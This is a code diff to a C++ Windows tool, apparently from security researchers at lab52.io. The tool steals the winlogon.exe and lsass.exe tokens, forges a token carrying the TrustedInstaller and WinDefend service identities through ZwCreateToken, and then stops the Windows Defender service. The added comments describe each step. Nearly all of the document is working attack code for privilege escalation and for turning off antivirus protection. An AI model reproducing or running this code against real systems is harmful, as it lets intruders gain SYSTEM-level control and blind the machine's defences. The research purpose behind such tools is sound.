@@ -1,3 +1,26 @@
+/*MIT License
+
+Copyright(c) 2022 lab52.io
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this softwareand associated documentation files(the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and /or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions :
+
+The above copyright noticeand this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+*/
+
 #include "stdafx.h"
 #include <windows.h>
 #include <iostream>
@@ -5,161 +28,24 @@
 #include <tlhelp32.h>
 #include <Lmcons.h>
 #include <tchar.h>
-#include "ntdll.h"
 #include <sddl.h>
+#include "ntdll.h"
+#include "util.h"
 
-BOOL SetPrivilege(
-	HANDLE hToken,          // access token handle
-	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
-	BOOL bEnablePrivilege   // to enable or disable privilege
-)
-{
-	TOKEN_PRIVILEGES tp;
-	LUID luid;
-
-	if (!LookupPrivilegeValue(
-		NULL,            // lookup privilege on local system
-		lpszPrivilege,   // privilege to lookup 
-		&luid))        // receives LUID of privilege
-	{
-		_tprintf(TEXT("[-] LookupPrivilegeValue error: %u\n"), GetLastError());
-		return FALSE;
-	}
-
-	tp.PrivilegeCount = 1;
-	tp.Privileges[0].Luid = luid;
-	if (bEnablePrivilege)
-		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	else
-		tp.Privileges[0].Attributes = 0;
-
-	// Enable the privilege or disable all privileges.
-
-	if (!AdjustTokenPrivileges(
-		hToken,
-		FALSE,
-		&tp,
-		sizeof(TOKEN_PRIVILEGES),
-		(PTOKEN_PRIVILEGES)NULL,
-		(PDWORD)NULL))
-	{
-		_tprintf(TEXT("[-] AdjustTokenPrivileges error: %u\n"), GetLastError());
-		return FALSE;
-	}
-
-	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
-
-	{
-		_tprintf(TEXT("[-] The token does not have the specified privilege. \n"));
-		return FALSE;
-	}
-
-	return TRUE;
-}
-
-std::wstring get_usernameW()
-{
-	TCHAR username[UNLEN + 1];
-	DWORD username_len = UNLEN + 1;
-	GetUserName(username, &username_len);
-	std::wstring username_w(username);
-	return username_w;
-}
-
-std::string get_username()
-{
-	TCHAR username[UNLEN + 1];
-	DWORD username_len = UNLEN + 1;
-	GetUserName(username, &username_len);
-	std::wstring username_w(username);
-	std::string username_s(username_w.begin(), username_w.end());
-	return username_s;
-}
-
-
-BOOL StopDefenderService() {
-	SERVICE_STATUS_PROCESS ssp;
-
-	SC_HANDLE schSCManager = OpenSCManager(
-		NULL,                    // local computer
-		NULL,                    // ServicesActive database 
-		SC_MANAGER_ALL_ACCESS);  // full access rights 
-
-	if (NULL == schSCManager)
-	{
-		_tprintf(TEXT("[-] OpenSCManager failed (%d)\n"), GetLastError());
-		return FALSE;
-	}
-
-	_tprintf(TEXT("[+] OpenSCManager success!\n"));
-
-	SC_HANDLE schService = OpenService(
-		schSCManager,         // SCM database 
-		L"WinDefend",            // name of service 
-		SERVICE_STOP |
-		SERVICE_QUERY_STATUS |
-		SERVICE_ENUMERATE_DEPENDENTS);
-
-	if (schService == NULL)
-	{
-		_tprintf(TEXT("[-] OpenService failed (%d)\n"), GetLastError());
-		CloseServiceHandle(schSCManager);
-		return FALSE;
-	}
-	_tprintf(TEXT("[+] OpenService success!\n"));
-
-	//Stopping service
-
-	if (!ControlService(
-		schService,
-		SERVICE_CONTROL_STOP,
-		(LPSERVICE_STATUS)&ssp))
-	{
-		_tprintf(TEXT("[-] ControlService failed (%d)\n", GetLastError()));
-		CloseServiceHandle(schService);
-		CloseServiceHandle(schSCManager);
-		return FALSE;
-	}
-
-}
-
-int GetProcessByNameW(PCTSTR name)
-{
-	DWORD pid = 0;
-
-	// Create toolhelp snapshot.
-	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	PROCESSENTRY32 process;
-	ZeroMemory(&process, sizeof(process));
-	process.dwSize = sizeof(process);
-
-	// Walkthrough all processes.
-	if (Process32First(snapshot, &process))
-	{
-		do
-		{
-			// Compare process.szExeFile based on format of name, i.e., trim file path
-			// trim .exe if necessary, etc.
-			if (wcscmp(process.szExeFile, name) == 0)
-			{
-				return process.th32ProcessID;
-			}
-		} while (Process32Next(snapshot, &process));
-	}
-
-	CloseHandle(snapshot);
-
-	return NULL;
-}
-
-BOOL ImpersonateProcessTokenByNameW(PCTSTR pname, PHANDLE retHandle) {
+/// <summary>
+/// Opens a user provided process by name and steals token for impersonation
+/// </summary>
+/// <param name="pname">Process Name</param>
+/// <param name="retHandle">Return Token Handle</param>
+/// <returns></returns>
+BOOL ImpersonateProcessTokenByName(PCTSTR pname, PHANDLE retHandle) {
 
 	// Initialize variables and structures
 	HANDLE tokenHandle = NULL;
 	HANDLE duplicateTokenHandle = NULL;
 
 	// Searching for Winlogon PID 
-	DWORD PID_TO_IMPERSONATE = GetProcessByNameW(pname);
+	DWORD PID_TO_IMPERSONATE = GetProcessByName(pname);
 
 	if (PID_TO_IMPERSONATE == NULL) {
 		_tprintf(TEXT("[-] %s process not found\n"), pname);
@@ -204,7 +90,7 @@ BOOL ImpersonateProcessTokenByNameW(PCTSTR pname, PHANDLE retHandle) {
 	if (GetLastError() == NULL)
 	{
 		_tprintf(TEXT("[+] %s ImpersonatedLoggedOnUser() success!\n"), pname);
-		_tprintf(TEXT("[+] %s Current user is: %s\n"), pname, (get_usernameW()).c_str());
+		_tprintf(TEXT("[+] %s Current user is: %s\n"), pname, (get_username()).c_str());
 	}
 	else
 	{
@@ -218,11 +104,17 @@ BOOL ImpersonateProcessTokenByNameW(PCTSTR pname, PHANDLE retHandle) {
 	CloseHandle(processHandle);
 
 	// Print whoami to compare to thread later
-	_tprintf(TEXT("[+] Current user is: %s\n"), (get_usernameW()).c_str());
+	_tprintf(TEXT("[+] Current user is: %s\n"), (get_username()).c_str());
 
 	return TRUE;
 }
 
+/// <summary>
+/// Gets infomration from a provided token
+/// </summary>
+/// <param name="current_token">Token handle</param>
+/// <param name="tic">Token information structure</param>
+/// <returns></returns>
 PVOID GetInfoFromToken(HANDLE current_token, TOKEN_INFORMATION_CLASS tic)
 {
 	DWORD n;
@@ -241,8 +133,13 @@ PVOID GetInfoFromToken(HANDLE current_token, TOKEN_INFORMATION_CLASS tic)
 	return 0;
 }
 
-
-HANDLE CreateTokenWinDefend(HANDLE base_token, BOOL isPrimary)
+/// <summary>
+/// Forge a new token with TrustedInstaller & Windefend service accounts using
+/// a base token
+/// </summary>
+/// <param name="base_token">Current token</param>
+/// <returns></returns>
+HANDLE CreateTokenWinDefend(HANDLE base_token)
 {
 	LUID luid;
 	PLUID pluidAuth;
@@ -251,7 +148,7 @@ HANDLE CreateTokenWinDefend(HANDLE base_token, BOOL isPrimary)
 	PLARGE_INTEGER pli;
 	DWORD sessionId;
 	HANDLE elevated_token;
-	//PTOKEN_STATISTICS stats;
+
 	PTOKEN_PRIVILEGES privileges;
 	PTOKEN_OWNER owner;
 	PTOKEN_PRIMARY_GROUP primary_group;
@@ -266,35 +163,17 @@ HANDLE CreateTokenWinDefend(HANDLE base_token, BOOL isPrimary)
 	TOKEN_SOURCE sourceToken = { { '!', '!', '!', '!', '!', '!', '!', '!' }, { 0, 0 } };
 	PSID lpSidOwner = NULL;
 	LUID authid = SYSTEM_LUID;
-	_ZwCreateToken ZwCreateToken;
-
-	/*
-	const SID6 TrustedInstallerSid = {
-	{
-		SID_REVISION, SECURITY_SERVICE_ID_RID_COUNT, SECURITY_NT_AUTHORITY, { SECURITY_SERVICE_ID_BASE_RID }
-	},
-	{
-		SECURITY_TRUSTED_INSTALLER_RID1,
-			SECURITY_TRUSTED_INSTALLER_RID2,
-			SECURITY_TRUSTED_INSTALLER_RID3,
-			SECURITY_TRUSTED_INSTALLER_RID4,
-			SECURITY_TRUSTED_INSTALLER_RID5,
-	}
-	};
-	*/
-	//SID_BUILTIN TkSidLocalServiceGroup = { 1, 2, { 0, 0, 0, 0, 0, 5 }, { 32, SECURITY_SERVICE_ID_BASE_RID } };
-
 	PSID group1, group2;
+
 	// TrustedInstaller SID
 	BOOL t = ConvertStringSidToSid(TEXT("S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464"), &group2);
 
 	//Windefend SID
 	t = ConvertStringSidToSid(TEXT("S-1-5-80-1913148863-3492339771-4165695881-2087618961-4109116736"), &group1);
 
-
-	ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
+	_ZwCreateToken ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
 	if (ZwCreateToken == NULL) {
-		printf("[-] Failed to load ZwCreateToken: %d\n", GetLastError());
+		_tprintf(TEXT("[-] Failed to load ZwCreateToken: %d\n"), GetLastError());
 		return NULL;
 	}
 
@@ -312,11 +191,8 @@ HANDLE CreateTokenWinDefend(HANDLE base_token, BOOL isPrimary)
 	sourceToken.SourceIdentifier.LowPart = luid.LowPart;
 	sourceToken.SourceIdentifier.HighPart = luid.HighPart;
 
-	//stats = (PTOKEN_STATISTICS)GetInfoFromToken(base_token, TokenStatistics);
-	//privileges = (PTOKEN_PRIVILEGES)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * 2));
 	privileges = (PTOKEN_PRIVILEGES)GetInfoFromToken(base_token, TokenPrivileges);
 
-	//get_system_privileges(privileges);
 	groups = (PTOKEN_GROUPS)GetInfoFromToken(base_token, TokenGroups);
 	primary_group = (PTOKEN_PRIMARY_GROUP)GetInfoFromToken(base_token, TokenPrimaryGroup);
 	default_dacl = (PTOKEN_DEFAULT_DACL)GetInfoFromToken(base_token, TokenDefaultDacl);
@@ -364,62 +240,49 @@ HANDLE CreateTokenWinDefend(HANDLE base_token, BOOL isPrimary)
 		owner,
 		primary_group,
 		default_dacl,
-		&sourceToken // creates an anonymous impersonation token
+		&sourceToken 
 	);
 
 	if (ntStatus == STATUS_SUCCESS)
 		return elevated_token;
 	else
-		printf("[-] Failed to create new token: %d %08x\n", GetLastError(), ntStatus);
+		_tprintf(TEXT("[-] Failed to create new token: %d %08x\n"), GetLastError(), ntStatus);
 
 	FreeSid(lpSidOwner);
-	//if (stats) LocalFree(stats);
 	if (groups) LocalFree(groups);
 	if (privileges) LocalFree(privileges);
+
 	return NULL;
 }
 
 
 int __cdecl _tmain(int argc, TCHAR* argv[]) {
 
-
-
-
-	
-	// Add SE debug privilege
-	/*
-	HANDLE currentTokenHandle = NULL;
-	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
-	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
-	{
-		_tprintf(L"[+] SeDebugPrivilege enabled!\n");
-	}
-	*/
-
-	
-
-	// Print whoami to compare to thread later
-	_tprintf(TEXT("[+] Current user is: %s\n"), (get_usernameW()).c_str());
-
 	HANDLE impersonatedTokenHandle = NULL;
-	if (!ImpersonateProcessTokenByNameW(TEXT("winlogon.exe"), &impersonatedTokenHandle))
+	// Print whoami to compare to thread later
+	_tprintf(TEXT("[+] Current user is: %s\n"), (get_username()).c_str());
+
+	//Step 1: Get System token and impersonate in current thread avoiding SeDebugPriv
+	if (!ImpersonateProcessTokenByName(TEXT("winlogon.exe"), &impersonatedTokenHandle))
 		exit(1);
 	
-	if (!ImpersonateProcessTokenByNameW(TEXT("lsass.exe"), &impersonatedTokenHandle))
+	//Step 2: Get a token with SeCreateTokenPriv enabled Ex. Lsass.exe have it
+	if (!ImpersonateProcessTokenByName(TEXT("lsass.exe"), &impersonatedTokenHandle))
 		exit(1);
 
-
-	impersonatedTokenHandle = CreateTokenWinDefend(impersonatedTokenHandle, FALSE);
+	//Step3: Forge a new token with Windefend and TrustedInstaller service accounts
+	impersonatedTokenHandle = CreateTokenWinDefend(impersonatedTokenHandle);
 
 	if (impersonatedTokenHandle == NULL)
 		exit(1);
 	
 	_tprintf(TEXT("[+] CreateTokenWinDefend success!\n"));
 
+	//Step 3: Impersonate with forged token
 	if (ImpersonateLoggedOnUser(impersonatedTokenHandle))
 	{
 		_tprintf(TEXT("[+] ImpersonatedLoggedOnUser() success!\n"));
-		_tprintf(TEXT("[+] Current user is: %s\n"), (get_usernameW()).c_str());
+		_tprintf(TEXT("[+] Current user is: %s\n"), (get_username()).c_str());
 	}
 	else
 	{
@@ -427,11 +290,12 @@ int __cdecl _tmain(int argc, TCHAR* argv[]) {
 		return FALSE;
 	}
 	
+	//Step 4: Finally Stop the defender service
 	if (StopDefenderService()) {
-		_tprintf(TEXT("[+] StopDefenderService() success!\n"));
+		_tprintf(TEXT("[+] StopDefenderServices success!\n"));
 	}
 	else {
-		_tprintf(TEXT("[-] StopDefenderService() Error: %i\n"), GetLastError());
+		_tprintf(TEXT("[-] StopDefenderServices Error: %i\n"), GetLastError());
 	}
 	
 	return 0;
